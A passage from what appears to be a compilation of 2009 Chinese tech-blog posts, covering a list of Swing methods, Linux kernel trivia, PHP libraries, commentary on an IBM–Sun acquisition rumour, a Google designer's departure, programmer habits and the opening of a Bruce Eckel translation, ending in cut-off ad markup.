321. javax.swing.JComponent.isOpaque()
322. javax.swing.JComponent.isOptimizedDrawingEnabled()
323. javax.swing.JComponent.isPaintingForPrint()
324. javax.swing.JComponent.isPaintingTile()
325. javax.swing.JComponent.isRequestFocusEnabled()
326. javax.swing.JComponent.isValidateRoot()
327. javax.swing.JComponent.paint(java.awt.Graphics)
328. javax.swing.JComponent.paintImmediately(int,int,int,int)
329. javax.swing.JComponent.paintImmediately(java.awt.Rectangle)
330. javax.swing.JComponent.print(java.awt.Graphics)
331. javax.swing.JComponent.printAll(java.awt.Graphics)
332. javax.swing.JComponent.putClientProperty(java.lang.Object,java.lang.Object)
333. javax.swing.JComponent.registerKeyboardAction(java.awt.event.ActionListener,java.lang.String,javax.swing.KeyStroke,int)
334. javax.swing.JComponent.registerKeyboardAction(java.awt.event.ActionListener,javax.swing.KeyStroke,int)
335. javax.swing.JComponent.removeAncestorListener(javax.swing.event.AncestorListener)
336. javax.swing.JComponent.removeVetoableChangeListener(java.beans.VetoableChangeListener)
337. javax.swing.JComponent.repaint(java.awt.Rectangle)
338. javax.swing.JComponent.repaint(long,int,int,int,int)
339. javax.swing.JComponent.requestDefaultFocus()
340. javax.swing.JComponent.requestFocus()
341. javax.swing.JComponent.requestFocus(boolean)
342. javax.swing.JComponent.requestFocusInWindow()
343. javax.swing.JComponent.resetKeyboardActions()
344. javax.swing.JComponent.reshape(int,int,int,int)
345. javax.swing.JComponent.revalidate()
346. javax.swing.JComponent.scrollRectToVisible(java.awt.Rectangle)
347. javax.swing.JComponent.setActionMap(javax.swing.ActionMap)
348. javax.swing.JComponent.setAlignmentX(float)
349. javax.swing.JComponent.setAlignmentY(float)
350. javax.swing.JComponent.setAutoscrolls(boolean)
351. javax.swing.JComponent.setBackground(java.awt.Color)
352. javax.swing.JComponent.setBorder(javax.swing.border.Border)
353. javax.swing.JComponent.setComponentPopupMenu(javax.swing.JPopupMenu)
354. javax.swing.JComponent.setDebugGraphicsOptions(int)
355. javax.swing.JComponent.setDefaultLocale(java.util.Locale)
356. javax.swing.JComponent.setDoubleBuffered(boolean)
357. javax.swing.JComponent.setFocusTraversalKeys(int,java.util.Set)
358. javax.swing.JComponent.setFont(java.awt.Font)
359. javax.swing.JComponent.setForeground(java.awt.Color)
360. javax.swing.JComponent.setInheritsPopupMenu(boolean)
361. javax.swing.JComponent.setInputMap(int,javax.swing.InputMap)
362. javax.swing.JComponent.setInputVerifier(javax.swing.InputVerifier)
363. javax.swing.JComponent.setMaximumSize(java.awt.Dimension)
364. javax.swing.JComponent.setMinimumSize(java.awt.Dimension)
365. javax.swing.JComponent.setNextFocusableComponent(java.awt.Component)
366. javax.swing.JComponent.setOpaque(boolean)
367. javax.swing.JComponent.setPreferredSize(java.awt.Dimension)
368. javax.swing.JComponent.setRequestFocusEnabled(boolean)
369. javax.swing.JComponent.setToolTipText(java.lang.String)
370. javax.swing.JComponent.setTransferHandler(javax.swing.TransferHandler)
371. javax.swing.JComponent.setVerifyInputWhenFocusTarget(boolean)
372. javax.swing.JComponent.setVisible(boolean)
373. javax.swing.JComponent.unregisterKeyboardAction(javax.swing.KeyStroke)
374. javax.swing.JComponent.update(java.awt.Graphics)
375. javax.swing.JMenu.add(java.awt.Component)
376. javax.swing.JMenu.add(java.awt.Component,int)
377. javax.swing.JMenu.add(java.lang.String)
378. javax.swing.JMenu.add(javax.swing.Action)
379. javax.swing.JMenu.add(javax.swing.JMenuItem)
380. javax.swing.JMenu.addMenuListener(javax.swing.event.MenuListener)
381. javax.swing.JMenu.addSeparator()
382. javax.swing.JMenu.applyComponentOrientation(java.awt.ComponentOrientation)
383. javax.swing.JMenu.doClick(int)
384. javax.swing.JMenu.getAccessibleContext()
385. javax.swing.JMenu.getComponent()
386. javax.swing.JMenu.getDelay()
387. javax.swing.JMenu.getItem(int)
388. javax.swing.JMenu.getItemCount()
389. javax.swing.JMenu.getMenuComponent(int)
390. javax.swing.JMenu.getMenuComponentCount()
391. javax.swing.JMenu.getMenuComponents()
392. javax.swing.JMenu.getMenuListeners()
393. javax.swing.JMenu.getPopupMenu()
394. javax.swing.JMenu.getSubElements()
395. javax.swing.JMenu.getUIClassID()
396. javax.swing.JMenu.insert(java.lang.String,int)
397. javax.swing.JMenu.insert(javax.swing.Action,int)
398. javax.swing.JMenu.insert(javax.swing.JMenuItem,int)
399. javax.swing.JMenu.insertSeparator(int)
400. javax.swing.JMenu.isMenuComponent(java.awt.Component)
401. javax.swing.JMenu.isPopupMenuVisible()
402. javax.swing.JMenu.isSelected()
403. javax.swing.JMenu.isTearOff()
404. javax.swing.JMenu.isTopLevelMenu()
405. javax.swing.JMenu.menuSelectionChanged(boolean)
406. javax.swing.JMenu.remove(int)
407. javax.swing.JMenu.remove(java.awt.Component)
408. javax.swing.JMenu.remove(javax.swing.JMenuItem)
409. javax.swing.JMenu.removeAll()
410. javax.swing.JMenu.removeMenuListener(javax.swing.event.MenuListener)
411. javax.swing.JMenu.setAccelerator(javax.swing.KeyStroke)
412. javax.swing.JMenu.setComponentOrientation(java.awt.ComponentOrientation)
413. javax.swing.JMenu.setDelay(int)
414. javax.swing.JMenu.setMenuLocation(int,int)
415. javax.swing.JMenu.setModel(javax.swing.ButtonModel)
416. javax.swing.JMenu.setPopupMenuVisible(boolean)
417. javax.swing.JMenu.setSelected(boolean)
418. javax.swing.JMenu.updateUI()
419. javax.swing.JMenuItem.addMenuDragMouseListener(javax.swing.event.MenuDragMouseListener)
420. javax.swing.JMenuItem.addMenuKeyListener(javax.swing.event.MenuKeyListener)
421. javax.swing.JMenuItem.getAccelerator()
422. javax.swing.JMenuItem.getMenuDragMouseListeners()
423. javax.swing.JMenuItem.getMenuKeyListeners()
424. javax.swing.JMenuItem.isArmed()
425. javax.swing.JMenuItem.processKeyEvent(java.awt.event.KeyEvent,javax.swing.MenuElement[],javax.swing.MenuSelectionManager)
426. javax.swing.JMenuItem.processMenuDragMouseEvent(javax.swing.event.MenuDragMouseEvent)
427. javax.swing.JMenuItem.processMenuKeyEvent(javax.swing.event.MenuKeyEvent)
428. javax.swing.JMenuItem.processMouseEvent(java.awt.event.MouseEvent,javax.swing.MenuElement[],javax.swing.MenuSelectionManager)
429. javax.swing.JMenuItem.removeMenuDragMouseListener(javax.swing.event.MenuDragMouseListener)
430. javax.swing.JMenuItem.removeMenuKeyListener(javax.swing.event.MenuKeyListener)
431. javax.swing.JMenuItem.setArmed(boolean)
432. javax.swing.JMenuItem.setEnabled(boolean)
433. javax.swing.JMenuItem.setUI(javax.swing.plaf.MenuItemUI)

最后，如果你知道某个类有更多的方法，请告诉我们。

# LINUX的15岁生日

今年是Linux的15生日，15年前，1994年3月， Linux kernel 版本1.0.0 released。这几天，全世界很多站点都在发布Blog庆祝Linux的15岁生日，而这篇文章是其中的一篇关于 Linux kernel 的，如果你是Linux的粉丝，希望你能喜欢。

[![mask-linus_torvalds](photo/mask-linus_torvalds-150x150.jpg)](https://coolshell.cn/wp-content/uploads/2009/03/mask-linus_torvalds.jpg)1. Linux是由一个芬兰的仅有21岁的大学生因为兴趣而产生的。

2. 为表扬他的突出贡献，有一颗小行星以他的名字命名。[http://en.wikipedia.org/wiki/9793_Torvalds](https://en.wikipedia.org/wiki/9793_Torvalds)。
3. 有上千个开发人员和程序员从世界的各个角落汇聚在一起，他们不停地开发Linux Kernel。
4. Linux kernel的官方吉祥物是一只小企鹅，叫做Tux.
5. 欧盟研究基金调查表明，Linux最新内核的评估价格在1.14亿美金。



6. 今天，Linux内核中只有2%的程序由 [Linus Torvalds](https://en.wikipedia.org/wiki/Linus_Torvalds)开发。
7. Linux内核是由C语语开发。
8. 今天Linux 是一个移值最广泛的操作系统内核，他可以运行在许多不同范围的系统上，包括PC，大型主机，嵌入式等等。
9. Linux kernel 版本1.0.0 一共有 176,250 行代码，而最新的 Linux kernel 有超过一千万行代码。下面是版本2的代码行列表。

1999年1月25日 – Linux 2.2.0 was released (1,800,847 代码行).

2001年1月4日 – Linux 2.4.0 was released (3,377,902 代码行).

2003年12月17日 – Linux 2.6.0 was released (5,929,913 代码行).

2008年12月24日 – Linux 2.6.28 was released (10,195,402 代码行).10. 使用一个软件，你可以让Microsoft Windows 和Linux kernel 可以同时的运行在同一台机器上，这个软件叫 [Cooperative Linux](http://www.colinux.org/) (coLinux).

11. 起初, Torvalds 想把这个内核叫做Freax (这个单词合并了 “free”和”freak”，并且使用 X 字母来表明这是一个 Unix-like 的东西)，但他的一个朋友Ari Lemmke，这是一个FTP的管理员，在第一次把Linux的内核放在FTP上供人下载时，他把这个目录命名成了 linux。
12. 一个叫William Della Croce的人注册了Linux商标，但最终他同意把这个商标还给了 Torvalds。
13. 今天，全世界500个超级计算机中有超过87%的系统使用了Linux内核。
14. 术语”vanilla kernel” 不是一种冰激凌，而是一个未更改过的Linux内核。
15. 目前的Linux内核使用了如下技术： [真正的抢先式多任务](https://en.wikipedia.org/wiki/Computer_multitasking#Preemptive_multitasking.2Ftime-sharing) ( [用户模式](https://en.wikipedia.org/wiki/User_mode) and [内核模式](https://en.wikipedia.org/wiki/Kernel_mode))， [虚拟内存](https://en.wikipedia.org/wiki/Virtual_memory), [动态链接库](https://en.wikipedia.org/wiki/Library_(computer_science))，[demand loading](https://en.wikipedia.org/wiki/Demand_paging), 共享式的[写时拷贝](https://en.wikipedia.org/wiki/Copy-on-write) , [内存管理](https://en.wikipedia.org/wiki/Memory_management), [Internet 协议包](https://en.wikipedia.org/wiki/Internet_protocol_suite), 和 [线程](https://en.wikipedia.org/wiki/Thread_(computer_science)).

# LINUX 相关的资源站MAKELINUX.NET

关于Linux相关的资源大家可以到http://www.makelinux.net/访问相关的文章，很不错的一个和linux内核相关的资源网站，当然，你可能因为种种原因不能访问这个网上的一些资源，那么你可能需要使用代理服务器或是一个叫Tor的软件，关于后者，请参看这篇文章[《如何上网觅无踪](https://coolshell.cn/articles/25.html)》

下面是makelinux上的资源列表，都非常不错。

# 20 你应该知道的PHP库

下面是一些非常有用的PHP类库，相信一定可以为你的WEB开发提供更好和更为快速的方法。

### 图表库

### ![021151lephpant-e_png](photo/021151lephpant-e_png.jpg)

下面的类库可以让你很简的创建复杂的图表和图片。当然，它们需要GD库的支持。

1. [pChart](http://pchart.sourceforge.net/) – 一个可以创建统计图的库。
2. [Libchart](http://naku.dohcrew.com/libchart/pages/introduction/) – 这也是一个简单的统计图库。
3. [JpGraph](http://www.aditus.nu/jpgraph/) – 一个面向对象的图片创建类。
4. [Open Flash Chart](http://teethgrinder.co.uk/open-flash-chart/) – 这是一个基于Flash的统计图。

 

### RSS 解析

解释RSS并是一件很单调的事情，不过幸好你有下面的类库可以帮助你方便地读取RSS的Feed。

1. [MagpieRSS](http://magpierss.sourceforge.net/) – 开源的PHP版RSS解析器，据说功能强大，未验证。
2. [SimplePie](http://simplepie.org/) – 这是一个非常快速，而且易用的RSS和Atom 解析库。

### 缩略图生成

1. [phpThumb](http://phpthumb.sourceforge.net/) – 功能很强大，如何强大还是自己去体会吧。

### 支付

你的网站需要处理支付方面的事情？需要一个和支付网关的程序？下面这个程序可以帮到你。

1. [PHP Payment Library](http://www.phpfour.com/blog/2009/02/php-payment-gateway-library-for-paypal-authorizenet-and-2checkout/) – 支持Paypal, Authorize.net 和2Checkout (2CO)

### OpenID

1. [PHP-OpenID](http://www.openidenabled.com/php-openid/) – 支持OpenID的一个PHP库。OpenID是帮助你使用相同的用户名和口令登录不同的网站的一种解决方案。如果你对OpenID不熟悉的话，你可以到这里看看：http://openid.net.cn/

### 数据为抽象/对象关系映射ORM

1. [ADOdb](http://adodb.sourceforge.net/) – 数据库抽象
2. [Doctrine](http://www.doctrine-project.org/) – 对象关系映射Object relational mapper (ORM) ，需要 PHP 5.2.3+ 版本，一个非常强大的database abstraction layer (DBAL).
3. [Propel](http://propel.phpdb.org/trac/) – 对象关系映射框架- PHP5
4. [Outlet](http://www.outlet-orm.org/site/) – 也是关于对象关系映射的一个工具。

注：对象关系映射（Object Relational Mapping，简称ORM）是一种为了解决面向对象与关系数据库存在的互不匹配的现象的技术。 简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。本质上就是将数据从一种形式转换到另外一种形式。 这也同时暗示者额外的执行开销；然而，如果ORM作为一种中间件实现，则会有很多机会做优化，而这些在手写的持久层并不存在。 更重要的是用于控制转换的元数据需要提供和管理；但是同样，这些花费要比维护手写的方案要少；而且就算是遵守ODMG规范的对象数据库依然需要类级别的元数据。

### PDF 生成器

1. [FPDF](http://www.fpdf.org/) – 这量一个可以让你生成PDF的纯PHP类库。

### Excel 相关

你的站点需要生成Excel？没有问题，下面这两个类库可以让你轻松做到这一点。

1. [php-excel](https://code.google.com/p/php-excel/) – 这是一个非常简单的Excel文件生成类。
2. [PHP Excel Reader](https://code.google.com/p/php-excel-reader/) – 可以解析并读取XLS文件中的数据。

### E-Mail 相关

不喜欢PHP的mail函数？觉得不够强大？下面的PHP邮件相关的库绝对不会让你失望。

1. [Swift Mailer](http://swiftmailer.org/) – 免费的超多功能的PHP邮件库。
2. [PHPMailer ](http://phpmailer.codeworxtech.com/)– 超强大的邮件发送类。

### 单元测试

如果你在使用测试驱动的方法开发你的程序，下面的类库和框架绝你能帮助你的开发。

1. [SimpleTest](http://www.simpletest.org/) – 一个PHP的单元测试和网页测试的框架。
2. [PHPUnit](https://www.phpunit.de/) – 来自xUnit 家族，提供一个框架可以让你方便地进行单元测试的案例开发。并可非常容易地分析其测试结果。

# IBM收购SUN，这是一种什么样的精神？

《华尔街日报》3月18日报导有消息说IBM要以65亿美金收购Sun（[原文](http://online.wsj.com/article/SB123735970806267921.html)），虽然消息未经证实，但已引起轩然大波。据[Business Joural](http://sanjose.bizjournals.com/sanjose/stories/2009/03/16/daily38.html)报道，周二，Sun的股票一下子涨了68%，从之前$4.97一下涨到了$8.36，但IBM的股价下跌4%到了$89.46。

而网上的博主们都在狂写评论文章了。有持支持态度的，这篇[博文](http://www.electronista.com/articles/09/03/18/ibm.may.buy.sun/)表明IBM和Sun都是喜欢开源（Linux 和OpenSolaris）以及跨平台的（Linux和Java）的，所以他们的合并可能更好的对抗微软和intel的x86平台，应该太有作为。还有这篇[博文](http://blog.internetnews.com/skerner/2009/03/ibm-sun-acquisition-good-for-u.html)则对比了HP收购Compaq(DEC)的案例，说明这样的合并可能更为容易和HP对抗。

当然，也有不认可以文章，比如ZNet上的这篇[文章](http://blogs.zdnet.com/Gardner/?p=2857)，作者觉得这根本就不可能，因为IBM和Sun有太多的重合了，很多方面都有存在很强的竞争，IBM要买来一点用都没有，要芯片技术吗？要操作系统吗？要数据库吗？要Java吗？更不可能。文中说，如果IBM想把Sun干掉，那么用65亿美金就太贵了，在这个寒冬，应该不用这种价格，除非这则新闻另有别的用意……

不过，最有意思的评论是[**这篇**](http://www.thevarguy.com/2009/03/18/ibm-targeting-sun-for-takeover-linux-mysql-potential-winners/)，简直是太精彩了，我忍不住想把之翻译在这里：



——————————————————————————

有报道说IBM准备使用至少65亿美金收购Sun Microsystems公司。如果这个交易发生的话，那么，难道这意味着 Solaris, SPARC, MySQL 和其它技术的会和IBM的核心产品重迭在一起？是否HP也会给Sun打个电话然后再给个价格呢？本人在此对于这个潜在的收购案给出四个预言。当然，Linux肯定是主宰了整个谈判。

基本上来说，本人并不是一个大型IT公司并购的Fans，因为你只要查看一下历史上的股票估价，你就会发现绝大多数的并购并不能像实际所说的那样。 (比如: Novell/WordPerfect, AT&T/NCR, AOL/Time Warner, Symantec/Veritas 等等).

当然，本人要给IBM收购Sun的这种行为竖个大拇哥以示表扬。为什么？[因为我们的Sun目前正生活在炼狱中](http://www.thevarguy.com/2009/01/30/is-sun-microsystems-the-new-novell/)，但是它却不可小视，因为这个公司有关很很的排列整齐的开源项目 ([MySQL](http://mysql.com/), [open source storage](http://www.thevarguy.com/2008/11/10/sun-open-storage-appliances-meet-the-open-source-channel/) 等) ，但是如果与 Sun的过时的生意(SPARC, Solaris, 等)比起来，这些只能为Sun带来硬币级利润的开源项目只能算个屁了。

如果IBM真的收购了Sun，那么下面是我的四个预言：

1. **长期停止Sun的基于RISC的 SPARC处理器。** IBM 本来就有了基于 RISC 技术的处理器( [POWER](https://en.wikipedia.org/wiki/IBM_POWER) 产品线)。让我们公正诚实地来看待这个问题，这些大的公司正在四周布满Intel服务器的环境下巩固他们的过气的RISC数据中心。我们不得不说，IBM的确干了一件相当出色的事情来长期地支援那些过气的硬件，而真实的研发 会出现一些POWER/SPARC 的结合变种以面对高端定位。
2.  **Sun Solaris 必然会被混合到 IBM AIX中。** 这个世界有太多的Unix了，IBM找到了一个很有创意的方法取代于继续支持两个Unix，那就是把Solais和AIX所有的功能特性合并到一起。然后和HP-UX竞争，但最终可能的结果也许为成为Linux。这里，我希望大家不要在OpenSolris这里纠缠争论，因为本人强烈地怀疑IBM会把OpenSolaris直接做成Linux的另一选择。
3. **MySQL 是个大赢家。**今天MySQL在东家Sun这里一看多了。MySQL在这些并购中的声望可以继续增涨，但是MySQL的职员可能会因此离开，而且MySQL内讧也会或多或少打击到开源数据。但有了强大的IBM Global Services 和 Big Blue 的销售渠道，MySQL 只会更加繁荣和兴旺。而且和DB2的联姻，IBM获得了一个强有力的组合拳（one-two punch） ，Oracle 和Microsoft SQL Server自然要被挨打。
4. **Linux。**这是这个游戏中最大最大的赢家。不但可以在IBM自主的技术蓝图中和Sun的硬件和软件联合起来，而且可以向Linux的数据中心进军，甚至Linux的桌面系统可以加快速度。相信我，绝对没错的。

不但如此，IBM 收购Sun 还绝对说明了三件事： 1）合并了技术，2）合并了员工，3）控制了Sun的客户基础。

Sun 用户不应该会恐慌，因为IBM拥有如此之强的实力会继续提供那些过气了的产品。实际上，Sun的用户只会在“如果IBM不收购Sun”时才会感到恐慌……

好了，让我用一个思考性的问题来结束这个文章吧——到底是谁泄露IBM收购Sun的这个价格？为什么要泄露？难道是有人想要把HP也拉进来坐地起价？

# 一位离开GOOGLE的设计师离职感言的读后感

Douglas Bowman, 一位Google的设计师，3月20日离开了Google。他在自己的[博客](http://stopdesign.com/)上留了一篇[感言](http://stopdesign.com/archive/2006/05/27/going-to-google.html)

很多人感兴趣Google是否是技术人员的天堂，也感兴趣Google有多少数据，更多人想撬开Google的创新引擎看看这个日渐庞大的企业如何能够保持特立独行的作风。本文不是关于这些，而是一个设计师的对Google的理解。

摘要：

> 当一个公司里没有一个透彻理解“设计的原则和元素”的领军人物时，很快这个公司就会在作出设计决定上感到枯竭。（原文：Without a person at (or near) the helm who thoroughly understands the [principles and elements of Design](http://en.wikipedia.org/wiki/Design_principles_and_elements), a company eventually runs out of reasons for design decisions.）

> 我感激Google工作的机会，学习很多，很好的食物…但我不会想念那被数据随意斩杀的设计理念。（原文：I’m thankful for the opportunity I had to work at Google. I learned more than I thought I would. I’ll miss the free food. I’ll miss the occasional massage. I’ll miss the authors, politicians, and celebrities that come to speak or perform. I’ll miss early chances to play with cool toys before they’re released to the public. Most of all, I’ll miss working with the incredibly smart and talented people I got to know there. But I won’t miss a design philosophy that lives or dies strictly by the sword of data.）



这个不得不让我们对于如何做出好的设计有些思考，尤其是我们多大程度上应该依赖数据，尤其是对数据的解释。正如剑桥大学的一篇关于[统计数据研讨会新闻报道](http://www.admin.cam.ac.uk/news/dp/2009031701)中说道：

> 统计数据是重要的，能够帮助我们做出日常判断甚至是预测将来提供依据，但是统计数据也是非常无聊的，而且容易被别有用心的人歪曲。（原文：Statistics are essential, from helping us to make choices in our day to day lives to predicting what might happen in the future, but often they are boring and can be manipulated to serve a particular purpose.）

这也同时让我们想到了《[怎样做一个Program Manager](https://coolshell.cn/articles/76.html)》 中所引述的，其实很多时候，需求和决定来自看似非常繁杂和近似混乱的沟通。

综合这些，以及我们对一般（非互联网）产品的设计的理解，我们仍然有理由相信，（互联网）的产品需要来自经验的直觉指导大胆而创新的改变；而此经验的获得和对数据快速反应的能力，来自一种叫做 strategic thinking 的能力。对于strategic thinking, 坦率的说是因为词汇匮乏，也更像是一种 quality without a name。

# 优秀程序员的十个习惯

在这个世界上，有数百万的人热衷于软件开发，他们有很多名字，如：软件工程师（Software Engineer），程序员（Programmer），编码人（Coder），开发人员（Developer）。经过一段时间后，这些人也许能够成为一个优秀的编码人员，他们会非常熟悉如何用计算机语言来完成自己的工作。但是，如果你要成为一个优秀的程序员，你还可以需要有几件事你需要注意，如果你能让下面十个条目成为你的习惯，那么你才能真正算得上是优秀程序员。

1. **学无止境**。就算是你有了10年以上的程序员经历，你也得要使劲地学习，因为你在计算机这个充满一创造力的领域，每天都会有很多很多的新事物出现。你需要跟上时代的步伐。你需要去了解新的程序语言，以及了解正在发展中的程序语言，以及一些编程框架。还需要去阅读一些业内的新闻，并到一些热门的社区去参与在线的讨论，这样你才能明白和了解整个软件开发的趋势。在国内，一些著名的社区例如：CSDN，ITPUB，CHINAUINX等等，在国外，建议你经常上一上digg.com去看看各种BLOG的聚合。



2. **掌握多种语言**。程序语言总是有其最适合的领域。当你面对需要解决的问题时，你需要找到一个最适合的语言来解决这些问题。比如，如果你需要性能，可能C/C++是首选，如果你需要跨平台，可能Java是首选，如果你要写一个Web上的开发程序，那么PHP，ASP，Ajax，JSP可能会是你的选择，如果你要处理一些文本并和别的应用交互，可能Perl, Python会是最好的。所以，花一些时间去探索一下其它你并熟悉的程序语言，能让你的眼界变宽，因为你被武装得更好，你思考问题也就更为全面，这对于自己和项目都会有好的帮助。
3. **理性面对不同的操作系统或技术**。程序员们总是有自己心目中无可比拟的技术和操作系统，有的人喜欢Ubuntu，有的人喜欢Debian，还有的人喜欢Windows，以及FreeBSD，MacOSX或Solaris等等。看看我的BLOG(http://blog.csdn.net/haoel)中的那篇《[其实Unix很简单](http://blog.csdn.net/haoel/archive/2007/03/19/1533720.aspx)》后的回复你就知道程序员们在维护起自己的忠爱时的那份执着了。只有一部分优秀的程序员明白不同操作系统的优势和长处和短处，这样，在系统选型的时候，才能做到真正的客观和公正，而不会让情绪影响到自己。同样，语言也是一样，有太多的程序员总是喜欢纠缠于语言的对比，如：Java和Perl。哪个刚刚出道的程序员没有争论去类似的话题呢？比如VC++和Delphi等等。争论这些东西只能表明自己的肤浅和浮燥。优秀的程序并不会执着于这些，而是能够理性的分析和理心地面对，从而才能客观地做出正确的选择。
4. **别把自己框在单一的开发环境中。** 再一次，正如上面所述，每个程序员都有自己忠爱的工具和技术，有的喜欢老的（比如我就喜欢Vi编辑程序），而有的喜欢新的比如gedit或是Emacs等。有的喜欢使用像VC++一样的图形界面的调试器，而我更喜欢GDB命令行方面的调式器。等等等等。程序员在使用什么样的工具上的争论还少吗？到处都是啊。使用什么样的工具本来无所谓，只要你能更好更快地达到你的目的。但是有一点是优秀程序员都应该了解的——那就是应该去尝试一下别的工作环境。没有比较，你永远不知道谁好谁不好，你也永远不知道你所不知道的。
5. **使用版本管理工具管理你的代码。**千万不要告诉我你不知道源码的版本管理，如果你的团队开发的源代码并没有版本管理系统，那么我要告诉你，你的软件开发还处于石器时代。赶快使用一个版式本管理工具吧。CVS 是一个看上去平淡无奇的版本工具，但它是被使用最广的版本管理系统，Subversion 是CVS的一个升级版，其正在开始接管CVS的领地。Git 又是一个不同的版本管理工具。还有Visual SourceSafe等。使用什么样的版本管理工具依赖于你的团队的大小和地理分布，你也许正在使用最有效率或最没有效率的工具来管理你的源代码。但一个优秀的程序员总是会使用一款源码版本管理工具来管理自己的代码。如果你要我推荐一个，我推荐你使用开源的Subversion。
6. **是一个优秀的团队成员。** 除非你喜欢独奏，除非你是孤胆英雄。但我想告诉你，今天，可能没有一个成熟的软件是你一个人能做的到的，你可能是你团队中最牛的大拿，但这并不意味着你就是好的团队成员。你的能力只有放到一个团队中才能施展开来。你在和你的团队成员交流中有礼貌吗？你是否经常和他们沟通，并且大家都喜欢和你在一起讨论问题？想一想一个足球队吧，你是这个队中好的成员吗？当别人看到你在场上的跑动时，当别人看到你的传球和接球和抢断时，你的团员成员能因为你的动作受到鼓舞吗？
7. **把你的工作变成文档。** 这一条目当然包括了在代码中写注释，但那还仅仅不够，你还需要做得更多。有良好的注释风格的代码是一个文档的基础，他能够让你和你的团队容易的明白你的意图和想法。写下文档，并不仅仅是怕我们忘了当时的想法，而且还是一种团队的离线交流的方法，更是一种知识传递的方法。记录下你所知道的一切会是一个好的习惯。因为，我相信你不希望别人总是在你最忙的时候来打断你问问题，或是你在休假的时候接到公司的电话来询问你问题。而你自己如果老是守着自己的东西，其结果只可能是让你自己长时间地深陷在这块东西内，而你就更本不可以去做更多的事情。包括向上的晋升。你可能以为“教会徒弟能饿死师父”，但我告诉你，你的保守会让你失去更多更好的东西，请你相信我，我绝不是在这里耸人听闻。
8. **注意备份和安全。** 可能你觉得这是一个“废话”，你已明白了备份的重要性。但是，我还是要在这里提出，丢失东西是我们人生中的一部份，你总是会丢东西，这点你永远无法避免。比如：你的笔记本电脑被人偷了，你的硬盘损坏了，你的电脑中病毒了，你的系统被人入侵了，甚至整个大楼被烧了，等等，等等。所以，做好备份工作是非常非常重要的事情，硬盘是不可信的，所以定期的刻录光盘或是磁带可能会是一个好的方法，网络也是不可信的，所以小心病毒和黑客，不但使用软件方面的安全策略，你更需要一个健全的管理制度。此外，尽量的让你的数据放在不同的地方，并做好定期（每日，每周，每月）的备份策略。
9. **设计要足够灵活。** 可能你的需求只会要求你实现一个死的东西，但是，你作为一个优秀的程序，你应该随时在思考这个死的东西是否可以有灵活的一面，比如把一些参数变成可以配置的，把一些公用的东西形成你的函数库以便以后重用，是否提供插件方面的功能？你的模块是否要以像积木一样随意组合？如果要有修改的话，你的设计是否能够马上应付？当然，灵活的设计可能并不是要你去重新发明轮子，你应该尽可能是使用标准化的东西。所谓灵话的设计就是要让让考虑更多需求之外的东西，把需求中这一类的问题都考虑到，而不是只处理需求中所说的那一特定的东西。比如说，需要需要的屏幕分辨率是800×600，那么你的设计能否灵活于其他的分辨率？程序设计总是需要我们去处理不同的环境，以及未来的趋势。我们需要用动态的眼光去思考问题，而不是刻舟求剑。也许有一天，你今天写的程序就要移植到别的环境中去，那个时候你就能真正明白什么是灵活的设计了。
10. **不要搬起石头砸自己的脚。**程序员总是有一种不好的习惯，那就是总是想赶快地完成自己手上的工作。但情况却往往事已愿违。越是想做得快，就越是容易出问题，越是想做得快，就越是容易遗漏问题，最终，程序改过来改过去，按下葫芦起了瓢，最后花费的时间和精力反而更多。欲速而不达。优秀程序员的习惯是前面多花一些时间多作一些调查，试验一下不同的解决方案，如果时间允许，一个好的习惯是，每4个小时的编程，需要一个小时的休息，然后又是4个小时的编码。当然，这因人而异，但其目的就是让你时常回头看看，让你想一想这样三个问题：1）是否这么做是对的？2）是否这么做考虑到了所有的情况？3）是否有更好的方法？想好了再说，时常回头看看走过的路，时常总结一下过去事，会对你有很大的帮助。

以上是十条优秀程序员的习惯或行为规范，希望其可以对你有所帮助。

本文来源于网上phil的BLOG，但我在写作过程中使用了自己的语言和方法重新描述了一下这十条，所以，我希望你在转载的时候能够注明作者和出处以表示对我的尊重。谢谢！

# C++和JAVA传统中积极的一面

**译者注**：

本文翻译自Bruce Eckel（《Thinking in C++》& 《Thinking in Java》作者）的博文，该博文于2009年03月14日发表于：

http://www.artima.com/weblogs/viewpost.jsp?thread=252441

本文的发表引起了互联网上热烈的讨论，关于讨论大家可以到[这里](http://www.artima.com/forums/flat.jsp?forum=106&thread=252441)围观。

下面是原文。原名《**The Positive Legacy of C++ and Java**》

**摘要：**

在最近的讨论中，有些人断定C++并不是一个设计完美的语言。在我在C++标准委员那8年里，我目睹所有关于C++的决议的诞生。我希望本文有助于帮读者理解C++和JAVA的设计选择，从而可以让大家更全面的来看待他们。

有人说，我很少再使用C++。当我使用C++时，我只是为了测试一下陈旧的代码，或者写一个和性能密切相关的程序，通常这个程序非常小，并且通过其他的语言来调用。(我喜欢的做法是，用Python快速开发一个程序，用profile辅助程序对其进行性能优化，如果需要的话，通过Python的ctypes调用C++写的程序来改善性能)。

<iframe id="aswift_3" name="aswift_3" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=665786259&amp;adf=4233962937&amp;pi=t.aa~a.425447425~i.15~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141032&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F209.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biIBTfRAnlNgxyr1MVrhxmYgHsfI1l35ots8vJyv-XZuFjV1rvzT7RPzZ1Vid_KuWY3kg7Y&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141907977&amp;bpp=1&amp;bdt=2716&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%